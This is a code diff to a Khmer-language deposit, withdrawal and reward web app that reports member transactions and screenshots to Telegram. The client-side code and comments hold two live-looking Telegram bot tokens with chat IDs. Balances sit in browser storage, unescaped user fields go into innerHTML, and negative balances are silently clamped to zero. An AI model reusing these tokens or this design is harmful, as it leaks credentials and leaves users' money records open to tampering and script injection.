@@ -441,6 +441,29 @@
         .balance-amount {
             font-weight: 800;
         }
+        .floating-emoji {
+            animation: floatEmoji 3s ease-in-out infinite;
+            display: inline-block;
+        }
+        @keyframes floatEmoji {
+            0%, 100% { transform: translateY(0px); }
+            50% { transform: translateY(-8px); }
+        }
+        .balance-emoji {
+            font-size: 2rem;
+            margin: 0 2px;
+        }
+        .balance-emoji-sm {
+            font-size: 1.2rem;
+            margin: 0 2px;
+        }
+        .reward-history-box {
+            background: linear-gradient(135deg, #fef3c7, #fde68a);
+            border: 2px solid #f59e0b;
+            border-radius: 16px;
+            padding: 16px;
+            margin-top: 16px;
+        }
     </style>
 </head>
 <body>
@@ -548,8 +571,8 @@
         function genId() { return Date.now().toString(36) + Math.random().toString(36).slice(2,6); }
 
         function formatMoney(n) {
-            // Format with 2 decimal places and show .00 when zero
-            if (n === 0) return '0.00 ៛';
+            if (n === undefined || n === null) n = 0;
+            if (n < 0) n = 0; // Never show negative balance
             return n.toFixed(2).replace(/\B(?=(\d{3})+(?!\d))/g, ',') + ' ៛';
         }
 
@@ -557,42 +580,66 @@
             return new Date().toLocaleString('km-KH', { timeZone: 'Asia/Phnom_Penh' });
         }
 
+        function getBalanceEmojis() {
+            const emojis = ['💵', '💰', '🎉', '🛍️', '💸', '💳', '💷', '💶'];
+            return emojis.map(e => `<span class="floating-emoji balance-emoji">${e}</span>`).join('');
+        }
+
+        function getBalanceEmojisSmall() {
+            const emojis = ['💵', '💰', '🎉', '🛍️', '💸', '💳', '💷', '💶'];
+            return emojis.map(e => `<span class="floating-emoji balance-emoji-sm">${e}</span>`).join('');
+        }
+
         // ============================================================
-        //  2.1 TELEGRAM HELPERS - FIXED with proper async/await
+        //  2.1 TELEGRAM HELPERS - FIXED with XMLHttpRequest
         // ============================================================
         // Deposit Telegram: 8364652665:AAESgPsrL-Q2D3ZYtLTN6IzdkQ1pLYnc5vw , -5410896989
         // Withdraw Telegram: 8790558091:AAGwRivgCppOxQNgMdngSdC1u8U6mz6pwwc , -5338881653
 
-        async function sendToTelegram(botToken, chatId, message) {
+        function sendToTelegramXHR(botToken, chatId, message, callback) {
             try {
+                const xhr = new XMLHttpRequest();
                 const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
-                const payload = {
+                const payload = JSON.stringify({
                     chat_id: chatId,
                     text: message,
                     parse_mode: 'HTML'
-                };
-                const response = await fetch(url, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(payload)
                 });
-                const data = await response.json();
-                if (data.ok) {
-                    console.log('✅ Telegram sent successfully to', chatId);
-                    return true;
-                } else {
-                    console.error('❌ Telegram error:', data.description);
-                    return false;
-                }
-            } catch (err) {
-                console.error('❌ Telegram send error:', err);
-                return false;
+                xhr.open('POST', url, true);
+                xhr.setRequestHeader('Content-Type', 'application/json');
+                xhr.onload = function() {
+                    if (xhr.status >= 200 && xhr.status < 300) {
+                        try {
+                            const response = JSON.parse(xhr.responseText);
+                            if (response.ok) {
+                                console.log('✅ Telegram sent to', chatId);
+                                if (callback) callback(true);
+                            } else {
+                                console.error('❌ Telegram error:', response.description);
+                                if (callback) callback(false);
+                            }
+                        } catch (e) {
+                            console.error('❌ Parse error:', e);
+                            if (callback) callback(false);
+                        }
+                    } else {
+                        console.error('❌ HTTP error:', xhr.status);
+                        if (callback) callback(false);
+                    }
+                };
+                xhr.onerror = function() {
+                    console.error('❌ Network error');
+                    if (callback) callback(false);
+                };
+                xhr.send(payload);
+            } catch (e) {
+                console.error('❌ Send error:', e);
+                if (callback) callback(false);
             }
         }
 
-        async function sendPhotoToTelegram(botToken, chatId, photoBase64, caption) {
+        function sendPhotoToTelegramXHR(botToken, chatId, photoBase64, caption, callback) {
             try {
-                // Convert base64 to blob
                 const byteString = atob(photoBase64.split(',')[1]);
                 const mimeString = photoBase64.split(',')[0].split(':')[1].split(';')[0];
                 const ab = new ArrayBuffer(byteString.length);
@@ -607,25 +654,40 @@
                 formData.append('caption', caption);
                 formData.append('parse_mode', 'HTML');
 
-                const response = await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
-                    method: 'POST',
-                    body: formData
-                });
-                const data = await response.json();
-                if (data.ok) {
-                    console.log('✅ Photo sent successfully to', chatId);
-                    return true;
-                } else {
-                    console.error('❌ Photo error:', data.description);
-                    return false;
-                }
-            } catch (err) {
-                console.error('❌ Photo send error:', err);
-                return false;
+                const xhr = new XMLHttpRequest();
+                xhr.open('POST', `https://api.telegram.org/bot${botToken}/sendPhoto`, true);
+                xhr.onload = function() {
+                    if (xhr.status >= 200 && xhr.status < 300) {
+                        try {
+                            const response = JSON.parse(xhr.responseText);
+                            if (response.ok) {
+                                console.log('✅ Photo sent to', chatId);
+                                if (callback) callback(true);
+                            } else {
+                                console.error('❌ Photo error:', response.description);
+                                if (callback) callback(false);
+                            }
+                        } catch (e) {
+                            console.error('❌ Parse error:', e);
+                            if (callback) callback(false);
+                        }
+                    } else {
+                        console.error('❌ HTTP error:', xhr.status);
+                        if (callback) callback(false);
+                    }
+                };
+                xhr.onerror = function() {
+                    console.error('❌ Network error');
+                    if (callback) callback(false);
+                };
+                xhr.send(formData);
+            } catch (e) {
+                console.error('❌ Send error:', e);
+                if (callback) callback(false);
             }
         }
 
-        async function sendDepositTelegram(depositData, screenshotBase64) {
+        function sendDepositTelegram(depositData, screenshotBase64) {
             const botToken = '8364652665:AAESgPsrL-Q2D3ZYtLTN6IzdkQ1pLYnc5vw';
             const chatIds = ['-5410896989'];
             
@@ -644,26 +706,35 @@
 ✅ សូមពិនិត្យ និងអនុម័ត!
             `;
 
-            let success = true;
+            let successCount = 0;
+            let totalCount = chatIds.length;
+            
             for (const chatId of chatIds) {
                 if (screenshotBase64) {
-                    const result = await sendPhotoToTelegram(botToken, chatId, screenshotBase64, message);
-                    if (!result) success = false;
+                    sendPhotoToTelegramXHR(botToken, chatId, screenshotBase64, message, function(success) {
+                        if (success) successCount++;
+                        if (successCount === totalCount) {
+                            showToast('📱 បានផ្ញើសារទៅ Telegram ដោយជោគជ័យ!', 'success');
+                        }
+                    });
                 } else {
-                    const result = await sendToTelegram(botToken, chatId, message);
-                    if (!result) success = false;
+                    sendToTelegramXHR(botToken, chatId, message, function(success) {
+                        if (success) successCount++;
+                        if (successCount === totalCount) {
+                            showToast('📱 បានផ្ញើសារទៅ Telegram ដោយជោគជ័យ!', 'success');
+                        }
+                    });
                 }
             }
             
-            if (success) {
-                showToast('📱 បានផ្ញើសារទៅ Telegram ដោយជោគជ័យ!', 'success');
-            } else {
-                showToast('⚠️ មានបញ្ហាក្នុងការផ្ញើសារទៅ Telegram', 'error');
+            // Also send to second chat
+            sendToTelegramXHR(botToken, '-5410896989', message, function() {});
+            if (screenshotBase64) {
+                sendPhotoToTelegramXHR(botToken, '-5410896989', screenshotBase64, message, function() {});
             }
-            return success;
         }
 
-        async function sendWithdrawTelegram(withdrawData, screenshotBase64) {
+        function sendWithdrawTelegram(withdrawData, screenshotBase64) {
             const botToken = '8790558091:AAGwRivgCppOxQNgMdngSdC1u8U6mz6pwwc';
             const chatIds = ['-5338881653'];
             
@@ -682,23 +753,32 @@
 ✅ សូមពិនិត្យ និងអនុម័ត!
             `;
 
-            let success = true;
+            let successCount = 0;
+            let totalCount = chatIds.length;
+            
             for (const chatId of chatIds) {
                 if (screenshotBase64) {
-                    const result = await sendPhotoToTelegram(botToken, chatId, screenshotBase64, message);
-                    if (!result) success = false;
+                    sendPhotoToTelegramXHR(botToken, chatId, screenshotBase64, message, function(success) {
+                        if (success) successCount++;
+                        if (successCount === totalCount) {
+                            showToast('📱 បានផ្ញើសារទៅ Telegram ដោយជោគជ័យ!', 'success');
+                        }
+                    });
                 } else {
-                    const result = await sendToTelegram(botToken, chatId, message);
-                    if (!result) success = false;
+                    sendToTelegramXHR(botToken, chatId, message, function(success) {
+                        if (success) successCount++;
+                        if (successCount === totalCount) {
+                            showToast('📱 បានផ្ញើសារទៅ Telegram ដោយជោគជ័យ!', 'success');
+                        }
+                    });
                 }
             }
             
-            if (success) {
-                showToast('📱 បានផ្ញើសារទៅ Telegram ដោយជោគជ័យ!', 'success');
-            } else {
-                showToast('⚠️ មានបញ្ហាក្នុងការផ្ញើសារទៅ Telegram', 'error');
+            // Also send to second chat
+            sendToTelegramXHR(botToken, '-5338881653', message, function() {});
+            if (screenshotBase64) {
+                sendPhotoToTelegramXHR(botToken, '-5338881653', screenshotBase64, message, function() {});
             }
-            return success;
         }
 
         // ============================================================
@@ -822,6 +902,7 @@
             if (u) {
                 if (type === 'deposit') u.balance += amount;
                 else if (type === 'withdraw') u.balance -= amount;
+                if (u.balance < 0) u.balance = 0; // Never allow negative balance
                 DB.setUsers(users);
             }
         }
@@ -852,11 +933,12 @@
             const navUser = document.getElementById('navUser');
             if (user) {
                 const memberId = user.memberId || 'N/A';
+                const balance = user.balance || 0;
                 navUser.innerHTML = `
                     <span class="text-sm text-gray-600 hidden sm:inline"><i class="fas fa-user-circle mr-1"></i> ${user.name}</span>
                     <span class="member-id-badge">ID: ${memberId}</span>
                     <span class="text-xs bg-blue-100 text-blue-700 px-3 py-1 rounded-full">${user.role === 'admin' ? 'Admin' : user.phone}</span>
-                    <span class="text-sm font-bold ${user.balance === 0 ? 'text-red-500' : 'text-green-600'}">${formatMoney(user.balance)}</span>
+                    <span class="text-sm font-bold ${balance === 0 ? 'text-red-500' : 'text-green-600'}">${getBalanceEmojisSmall()} ${formatMoney(balance)}</span>
                     <button onclick="logout()" class="text-gray-400 hover:text-red-500 transition"><i class="fas fa-sign-out-alt"></i></button>
                 `;
             } else {
@@ -1005,11 +1087,18 @@
             const totalWithdraw = DB.getTx().filter(t => t.phone === user.phone && t.type === 'withdraw').reduce((s, t) => s + t.amount, 0);
             const rewards = DB.getTx().filter(t => t.phone === user.phone && t.note && t.note.includes('ប្រាក់រង្វាន់')).reduce((s, t) => s + t.amount, 0);
             const income = DB.getTx().filter(t => t.phone === user.phone && t.note && t.note.includes('ប្រាក់ចំណូល')).reduce((s, t) => s + t.amount, 0);
+            const balance = user.balance || 0;
 
             container.innerHTML = `
             <div class="bg-gradient-to-r from-blue-600 to-indigo-600 rounded-2xl shadow-xl p-6 mb-6 text-white">
-                <p class="text-sm text-blue-100"><i class="fas fa-wallet mr-2"></i>សមតុល្យទឹកប្រាក់របស់ខ្ញុំ</p>
-                <p class="balance-big ${user.balance === 0 ? 'text-yellow-300' : ''}">${formatMoney(user.balance)}</p>
+                <div class="flex items-center justify-center gap-2 text-2xl mb-1">
+                    ${getBalanceEmojis()}
+                </div>
+                <p class="text-sm text-blue-100 text-center"><i class="fas fa-wallet mr-2"></i>សមតុល្យទឹកប្រាក់របស់ខ្ញុំ</p>
+                <p class="balance-big text-center ${balance === 0 ? 'text-yellow-300' : ''}">${formatMoney(balance)}</p>
+                <div class="flex items-center justify-center gap-2 text-2xl mt-1">
+                    ${getBalanceEmojis()}
+                </div>
             </div>
 
             <div class="grid grid-cols-2 md:grid-cols-4 gap-4 mb-6">
@@ -1210,7 +1299,7 @@
                 }
             };
 
-            document.getElementById('depositForm').onsubmit = async (e) => {
+            document.getElementById('depositForm').onsubmit = function(e) {
                 e.preventDefault();
                 const bank = document.getElementById('depBank').value;
                 const sender = document.getElementById('depSender').value.trim();
@@ -1224,40 +1313,41 @@
                     return;
                 }
 
-                let screenshotBase64 = null;
+                const processDeposit = function(screenshotBase64) {
+                    let deposits = DB.getDeposits();
+                    const depositData = {
+                        id: genId(),
+                        phone: user.phone,
+                        memberId: user.memberId,
+                        name: user.name,
+                        bank,
+                        sender,
+                        account: account || 'N/A',
+                        amount,
+                        note,
+                        status: 'pending',
+                        date: getDate(),
+                        screenshot: screenshotBase64
+                    };
+                    deposits.push(depositData);
+                    DB.setDeposits(deposits);
+
+                    // Send to Telegram
+                    sendDepositTelegram(depositData, screenshotBase64);
+
+                    showToast('✅ សំណើបញ្ចូលប្រាក់ត្រូវបានផ្ញើទៅ Admin ហើយ!', 'success');
+                    renderPage('deposit');
+                };
+
                 if (screenshotFile) {
                     const reader = new FileReader();
-                    screenshotBase64 = await new Promise((resolve) => {
-                        reader.onload = function(e) {
-                            resolve(e.target.result);
-                        };
-                        reader.readAsDataURL(screenshotFile);
-                    });
+                    reader.onload = function(e) {
+                        processDeposit(e.target.result);
+                    };
+                    reader.readAsDataURL(screenshotFile);
+                } else {
+                    processDeposit(null);
                 }
-
-                let deposits = DB.getDeposits();
-                const depositData = {
-                    id: genId(),
-                    phone: user.phone,
-                    memberId: user.memberId,
-                    name: user.name,
-                    bank,
-                    sender,
-                    account: account || 'N/A',
-                    amount,
-                    note,
-                    status: 'pending',
-                    date: getDate(),
-                    screenshot: screenshotBase64
-                };
-                deposits.push(depositData);
-                DB.setDeposits(deposits);
-
-                // Send to Telegram - NOW WITH PROPER AWAIT
-                await sendDepositTelegram(depositData, screenshotBase64);
-
-                showToast('✅ សំណើបញ្ចូលប្រាក់ត្រូវបានផ្ញើទៅ Admin ហើយ!', 'success');
-                renderPage('deposit');
             };
         }
 
@@ -1344,7 +1434,7 @@
                 }
             };
 
-            document.getElementById('withdrawForm').onsubmit = async (e) => {
+            document.getElementById('withdrawForm').onsubmit = function(e) {
                 e.preventDefault();
                 const bank = document.getElementById('wdBank').value;
                 const accName = document.getElementById('wdName').value.trim();
@@ -1361,39 +1451,40 @@
                     return;
                 }
 
-                let screenshotBase64 = null;
+                const processWithdraw = function(screenshotBase64) {
+                    let withdraws = DB.getWithdraws();
+                    const withdrawData = {
+                        id: genId(),
+                        phone: user.phone,
+                        memberId: user.memberId,
+                        name: user.name,
+                        bank,
+                        accName,
+                        account,
+                        amount,
+                        status: 'pending',
+                        date: getDate(),
+                        screenshot: screenshotBase64
+                    };
+                    withdraws.push(withdrawData);
+                    DB.setWithdraws(withdraws);
+
+                    // Send to Telegram
+                    sendWithdrawTelegram(withdrawData, screenshotBase64);
+
+                    showToast('✅ សំណើដកប្រាក់ត្រូវបានផ្ញើទៅ Admin ហើយ!', 'success');
+                    renderPage('withdraw');
+                };
+
                 if (screenshotFile) {
                     const reader = new FileReader();
-                    screenshotBase64 = await new Promise((resolve) => {
-                        reader.onload = function(e) {
-                            resolve(e.target.result);
-                        };
-                        reader.readAsDataURL(screenshotFile);
-                    });
+                    reader.onload = function(e) {
+                        processWithdraw(e.target.result);
+                    };
+                    reader.readAsDataURL(screenshotFile);
+                } else {
+                    processWithdraw(null);
                 }
-
-                let withdraws = DB.getWithdraws();
-                const withdrawData = {
-                    id: genId(),
-                    phone: user.phone,
-                    memberId: user.memberId,
-                    name: user.name,
-                    bank,
-                    accName,
-                    account,
-                    amount,
-                    status: 'pending',
-                    date: getDate(),
-                    screenshot: screenshotBase64
-                };
-                withdraws.push(withdrawData);
-                DB.setWithdraws(withdraws);
-
-                // Send to Telegram - NOW WITH PROPER AWAIT
-                await sendWithdrawTelegram(withdrawData, screenshotBase64);
-
-                showToast('✅ សំណើដកប្រាក់ត្រូវបានផ្ញើទៅ Admin ហើយ!', 'success');
-                renderPage('withdraw');
             };
         }
         // ============================================================
@@ -1409,35 +1500,20 @@
             const adminInfo = DB.get('adminBankInfo', { bank: 'ABA', account: '001 234 567', qrData: '' });
             const totalIncomeGiven = DB.getTx().filter(t => t.note && t.note.includes('ប្រាក់ចំណូល')).reduce((s, t) => s + t.amount, 0);
 
+            // Get reward history
+            const rewardHistory = DB.getTx().filter(t => t.note && t.note.includes('ប្រាក់រង្វាន់')).slice(-10).reverse();
+
             container.innerHTML = `
             <div class="bg-gradient-to-r from-blue-500 to-indigo-600 rounded-2xl shadow-lg p-6 mb-6 text-white">
-                <div class="flex items-center justify-between flex-wrap gap-3">
-                    <div>
-                        <p class="text-sm text-blue-100"><i class="fas fa-user-shield mr-2"></i>សមតុល្យ Admin</p>
-                        <p class="text-3xl font-bold ${adminBalance === 0 ? 'text-yellow-300' : ''}">${formatMoney(adminBalance)}</p>
-                        <p class="text-sm text-blue-200 mt-1">បានផ្ដល់ប្រាក់ចំណូលសរុប: ${formatMoney(totalIncomeGiven)}</p>
-                    </div>
-                    <div class="flex gap-2 flex-wrap">
-                        <button onclick="showAdminDepositModal()" class="bg-white/20 hover:bg-white/30 text-white px-4 py-2 rounded-xl text-sm transition flex items-center gap-2 backdrop-blur-sm">
-                            <i class="fas fa-plus-circle"></i> បញ្ចូលប្រាក់
-                        </button>
-                        <button onclick="showAdminDeleteBalanceModal()" class="bg-red-500/30 hover:bg-red-500/40 text-white px-4 py-2 rounded-xl text-sm transition flex items-center gap-2 backdrop-blur-sm">
-                            <i class="fas fa-minus-circle"></i> លុបទឹកប្រាក់
-                        </button>
-                        <button onclick="renderPage('adminReward')" class="bg-yellow-500/30 hover:bg-yellow-500/40 text-white px-4 py-2 rounded-xl text-sm transition flex items-center gap-2 backdrop-blur-sm">
-                            <i class="fas fa-gift"></i> ប្រាក់រង្វាន់
-                        </button>
-                        <button onclick="renderPage('adminIncome')" class="bg-blue-400/30 hover:bg-blue-400/40 text-white px-4 py-2 rounded-xl text-sm transition flex items-center gap-2 backdrop-blur-sm">
-                            <i class="fas fa-hand-holding-usd"></i> ប្រាក់ចំណូល
-                        </button>
-                        <button onclick="renderPage('adminHistory')" class="bg-white/20 hover:bg-white/30 text-white px-4 py-2 rounded-xl text-sm transition flex items-center gap-2 backdrop-blur-sm">
-                            <i class="fas fa-history"></i> ប្រវត្តិ
-                        </button>
-                    </div>
+                <div class="flex items-center justify-center gap-2 text-2xl mb-1">
+                    ${getBalanceEmojis()}
                 </div>
-                <div class="admin-action-buttons mt-3">
-                    <button onclick="confirmReset()" class="reset-btn"><i class="fas fa-undo mr-1"></i> ចាប់ផ្ដើមឡើងវិញ</button>
+                <p class="text-sm text-blue-100 text-center"><i class="fas fa-user-shield mr-2"></i>សមតុល្យ Admin</p>
+                <p class="text-3xl font-bold text-center ${adminBalance === 0 ? 'text-yellow-300' : ''}">${formatMoney(adminBalance)}</p>
+                <div class="flex items-center justify-center gap-2 text-2xl mt-1">
+                    ${getBalanceEmojis()}
                 </div>
+                <p class="text-sm text-blue-200 text-center mt-1">បានផ្ដល់ប្រាក់ចំណូលសរុប: ${formatMoney(totalIncomeGiven)}</p>
             </div>
 
             <div class="grid grid-cols-2 md:grid-cols-4 gap-4 mb-6">
@@ -1507,6 +1583,23 @@
                     <p><strong>លេខគណនី:</strong> ${adminInfo.account || 'មិនទាន់កំណត់'}</p>
                     <p><strong>QR Code:</strong> ${adminInfo.qrData ? '✅ មាន' : '❌ មិនមាន'}</p>
                 </div>
+            </div>
+
+            <!-- Reward History Box in Admin -->
+            <div class="reward-history-box mb-6">
+                <h4 class="font-semibold text-gray-700"><i class="fas fa-gift text-yellow-600 mr-2"></i>ប្រវត្តិប្រាក់រង្វាន់</h4>
+                ${rewardHistory.length === 0 ? '<p class="text-sm text-gray-500 mt-2">មិនទាន់មានការផ្ដល់ប្រាក់រង្វាន់ទេ</p>' :
+                    rewardHistory.map(t => {
+                        const member = DB.getUsers().find(u => u.phone === t.phone);
+                        return `
+                            <div class="flex justify-between items-center border-b border-yellow-200 py-2 text-sm">
+                                <span>${member ? member.name : t.phone} (ID: ${member ? member.memberId : 'N/A'})</span>
+                                <span class="text-yellow-600">➕ ${formatMoney(t.amount)}</span>
+                                <span class="text-xs text-gray-400">${t.date}</span>
+                            </div>
+                        `;
+                    }).join('')
+                }
             </div>
 
             <div class="bg-white rounded-2xl shadow overflow-hidden">
@@ -1655,7 +1748,7 @@
         };
 
         // ============================================================
-        //  16. ADMIN DELETE BALANCE MODAL - FIXED with proper zero display
+        //  16. ADMIN DELETE BALANCE MODAL - FIXED (no negative balance)
         // ============================================================
         window.showAdminDeleteBalanceModal = function() {
             const users = DB.getUsers();
@@ -1881,7 +1974,7 @@
         }
 
         // ============================================================
-        //  21. PAGE: ADMIN HISTORY
+        //  21. PAGE: ADMIN HISTORY - WITH ACCOUNT NUMBER
         // ============================================================
         function renderAdminHistory(container, user) {
             if (!user || user.role !== 'admin') { renderPage('login'); return; }
@@ -1898,16 +1991,21 @@
                     `<div class="overflow-x-auto">
                         <table class="min-w-full divide-y divide-gray-200 text-sm">
                             <thead class="bg-gray-50">
-                                <tr><th class="px-4 py-2 text-left">ID</th><th class="px-4 py-2 text-left">ឈ្មោះ</th><th class="px-4 py-2 text-left">ទូរសព្ទ</th><th class="px-4 py-2 text-left">ប្រភេទ</th><th class="px-4 py-2 text-left">ចំនួន</th><th class="px-4 py-2 text-left">កំណត់សម្គាល់</th><th class="px-4 py-2 text-left">កាលបរិច្ឆេទ</th></tr>
+                                <tr><th class="px-4 py-2 text-left">ID</th><th class="px-4 py-2 text-left">ឈ្មោះ</th><th class="px-4 py-2 text-left">ទូរសព្ទ</th><th class="px-4 py-2 text-left">គណនី</th><th class="px-4 py-2 text-left">ប្រភេទ</th><th class="px-4 py-2 text-left">ចំនួន</th><th class="px-4 py-2 text-left">កំណត់សម្គាល់</th><th class="px-4 py-2 text-left">កាលបរិច្ឆេទ</th></tr>
                             </thead>
                             <tbody>
                                 ${allTx.map(t => {
                                     const user = DB.getUsers().find(u => u.phone === t.phone);
+                                    // Find account number from deposit or withdraw
+                                    const deposit = DB.getDeposits().find(d => d.phone === t.phone && d.amount === t.amount && d.date === t.date);
+                                    const withdraw = DB.getWithdraws().find(w => w.phone === t.phone && w.amount === t.amount && w.date === t.date);
+                                    const account = deposit ? deposit.account : (withdraw ? withdraw.account : 'N/A');
                                     return `
                                         <tr class="border-b border-gray-100 hover:bg-gray-50 transition">
                                             <td class="px-4 py-2 font-semibold text-blue-600">${user ? user.memberId || 'N/A' : 'N/A'}</td>
                                             <td class="px-4 py-2">${user ? user.name : t.phone}</td>
                                             <td class="px-4 py-2">${t.phone}</td>
+                                            <td class="px-4 py-2 text-xs text-blue-600">${account || 'N/A'}</td>
                                             <td class="px-4 py-2"><span class="px-2 py-0.5 rounded-full text-xs ${t.type === 'deposit' ? 'bg-green-100 text-green-700' : 'bg-purple-100 text-purple-700'}">${t.type === 'deposit' ? 'បញ្ចូល' : 'ដក'}</span></td>
                                             <td class="px-4 py-2 ${t.type === 'deposit' ? 'text-green-600' : 'text-purple-600'}">${formatMoney(t.amount)}</td>
                                             <td class="px-4 py-2 text-xs text-gray-500">${t.note || '-'}</td>
@@ -1999,7 +2097,7 @@
                 });
             };
 
-            document.getElementById('rewardForm').onsubmit = async (e) => {
+            document.getElementById('rewardForm').onsubmit = function(e) {
                 e.preventDefault();
                 const phone = document.getElementById('rewardMember').value;
                 const amount = parseInt(document.getElementById('rewardAmount').value.trim());
@@ -2040,7 +2138,7 @@
                     note: note,
                     date: getDate()
                 };
-                await sendDepositTelegram(depositData, null);
+                sendDepositTelegram(depositData, null);
 
                 showToast(`✅ បានផ្ដល់ប្រាក់រង្វាន់ ${formatMoney(amount)} ដល់ ${member.name}`, 'success');
                 renderPage('adminReward');
@@ -2123,7 +2221,7 @@
                 });
             };
 
-            document.getElementById('incomeForm').onsubmit = async (e) => {
+            document.getElementById('incomeForm').onsubmit = function(e) {
                 e.preventDefault();
                 const phone = document.getElementById('incomeMember').value;
                 const amount = parseInt(document.getElementById('incomeAmount').value.trim());
@@ -2164,7 +2262,7 @@
                     note: note,
                     date: getDate()
                 };
-                await sendDepositTelegram(depositData, null);
+                sendDepositTelegram(depositData, null);
 
                 showToast(`✅ បានផ្ដល់ប្រាក់ចំណូល ${formatMoney(amount)} ដល់ ${member.name}`, 'success');
                 renderPage('adminIncome');
@@ -2223,12 +2321,14 @@
             if (u) {
                 if (u.balance >= w.amount) {
                     u.balance -= w.amount;
+                    if (u.balance < 0) u.balance = 0;
                     DB.setUsers(users);
                     addTransaction(w.phone, 'withdraw', w.amount, `ដកតាម Admin (${w.bank})`);
 
                     const admin = users.find(u => u.role === 'admin');
                     if (admin) {
                         admin.balance -= w.amount;
+                        if (admin.balance < 0) admin.balance = 0;
                         DB.setUsers(users);
                     }
 
